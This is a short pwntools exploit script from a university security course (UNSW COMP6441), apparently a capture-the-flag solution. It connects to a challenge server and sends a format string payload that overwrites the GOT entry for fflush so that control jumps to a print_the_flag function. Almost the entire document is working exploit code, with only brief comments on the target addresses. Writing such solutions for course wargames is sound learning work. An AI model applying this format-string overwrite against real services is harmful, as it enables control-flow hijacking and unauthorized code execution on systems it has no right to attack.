# z5206677 - Andrew Wong
# https://featherbear.github.io/UNSW-COMP6441/blog/post/plsdonthaq.me

from pwn import *

conn = remote("plsdonthaq.me", "1002")
conn.recvuntil("format string> ")

# Create a format string exploit to set `*(0x0804c010) = 0x080492be`
# 0x0804c010 -> GOT entry for `fflush`
# 0x080492be -> Address of `print_the_flag`

# Prepended a "." to fix alignment issues.

conn.send("." + fmtstr_payload(6, {0x0804c010: 0x080492be}, 1, write_size="byte") + "\n") 
conn.interactive()